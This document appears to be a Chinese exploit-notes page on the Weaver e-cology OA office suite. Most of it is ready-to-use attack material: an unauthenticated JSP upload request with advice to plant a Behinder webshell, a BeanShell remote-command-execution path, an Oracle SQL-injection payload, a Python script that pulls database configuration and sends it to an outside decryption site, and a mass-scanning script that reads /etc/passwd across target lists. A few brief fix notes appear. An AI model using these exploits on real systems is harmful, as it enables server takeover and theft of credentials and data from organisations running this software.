---
title: Weaver-Ecology-OA(泛微)
---

## 应用简介

[泛微OA](https://www.weaver.com.cn/e9/?source=1&kw=ppc-190319-1&bd_vid=11544877500503095345)，协同办公平台

## 泛微OA 9前台任意文件上传

漏洞位于: `/page/exportImport/uploadOperation.jsp`文件中

**EXP**

```http
POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: 112.91.144.90:5006
Content-Type:multipart/form-data; boundary=_7oLrplgUbU3CeDBqVeX3F5ByzJPkjf1-
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 242



--_7oLrplgUbU3CeDBqVeX3F5ByzJPkjf1-
Content-Disposition: form-data; name="file"; filename="2.jsp"
Content-Type: application-stream
Content-Teansfer-Encoding:binary

<%out.print("123");%>

--_7oLrplgUbU3CeDBqVeX3F5ByzJPkjf1---
```

替换上边`<%out.print("123");%>`的地方为冰蝎马即可

## [CNVD-2019-32204]-远程命令执行

**漏洞概述**

```http
#影响范围
E-cology 7.0
E-cology 8.0
E-cology 8.1
E-cology 9.0
```

由于beanshell这个接口可被未授权访问，同时这个接口在接受用户请求时未进行相应过滤，最终导致远程命令执行

**漏洞利用**

直接在网站根目录后加入组件访问路径

```http
/weaver/bsh.servlet.BshServlet/
```

在script处输入的指令

```bash
exec("whoami")
```

**修复建议**

升级到最新版本

**漏洞分析**

https://xz.aliyun.com/t/6560

## WorkflowCenterTreeData SQL注入

**POC**

仅限oracle数据库

```http
POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1  
Host: ip:port  
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 2236  
Connection: close  
Upgrade-Insecure-Requests: 1  

formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1  
```

NULL为查询字段 

## 数据库配置信息泄露

泛微e-cology OA系统`/mobile/DBconfigReader.jsp`存在未授权访问，通过解密，可直接获取数据库配置信息。

**利用前提**
`/mobile/DBconfigReader.jsp`存在未授权访问

**POC**

```python
import base64
import requests
import ast
 
def req(url):
    headers =  {
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    }
 
    r1 = requests.get(url,headers=headers).content
    s = r1.replace('\r\n','')
    res1 = base64.b64encode(s)
     
    postdata = {
        'data':res1,
        'type':'des',
        'arg':'m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1'
    }
    u = 'http://tool.chacuo.net/cryptdes'
    r2 = requests.post(u,data=postdata,headers=headers).content
    res2 = ast.literal_eval(r2)
     
    return res2['data']
 
url = 'http://58.2xxx:8888//mobile/DBconfigReader.jsp'
print req(url)
```

## 未授权任意文件读取

**漏洞概述**

```http
#影响范围
2018-2019
```

**漏洞利用**

1、访问一下接口，在返回包有id字符串

```bash
#windows
/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt

#Linux
/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd/&fileExt=txt
```

2、上批量EXP检测

```bash
#coding=utf-8
'''
author: wintrysec
用法:urls.txt中存放目标资产列表（URL或IP都行），验证成功的结果保存在success.txt
python3 泛微云桥批量FileDownLoad.py
'''

import requests
from random import choice

USER_AGENTS = [
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
]
headers = {}

def GetFileID(url, i):
    try:
        checkUrl = url + '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt'
        headers["User-Agent"] = choice(USER_AGENTS)
        res = requests.get(checkUrl, headers=headers, timeout=8)
        resText = res.json()
        if "id" in resText:
            result = url + "/file/fileNoLogin/" + resText["id"]
            write_result(result,i)
        elif "msg" in resText:
            checkUrl = url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd/&fileExt=txt"
            res = requests.get(checkUrl, headers=headers, timeout=10)
            resText = res.json()
            if "id" in resText:
                result = url + "/file/fileNoLogin/" + resText["id"]
                write_result(result,i)
            else:
                print("【{i}】".format(i=i) + url + " Is-No-Vuln")
        else:
            print("【{i}】".format(i=i) + url + " Is-No-Vuln")
    except:
        print("【{i}】".format(i=i) + url + "连接超时")

def get_url():
    i = 1
    with open('urls.txt', 'r') as f:
        for line in f:
            url = line.replace('\n', '')
            if url[0:5] == 'https':
                url = url
            elif url[0:4] == 'http':
                url = url
            else:
                url = 'http://' + url
            GetFileID(url, i)
            i += 1
def write_result(result,i):
    print("【{i}】".format(i=i) + result)
    with open('success.txt', 'a') as f:
        f.write(result+'\n')

if __name__ == '__main__':
	get_url()
```

**修复建议**

关闭程序路由 /file/fileNoLogin

## [2015年]-codeEdit.jsp页面-任意文件上传

未授权访问，无需登录上传文件

```http
http://localhost:8088/sysinterface/codeEdit.jsp?filename=ccccc.jsp&filetype=jsp
```

filename为文件名称，为空时会自动创建，点击提交会保存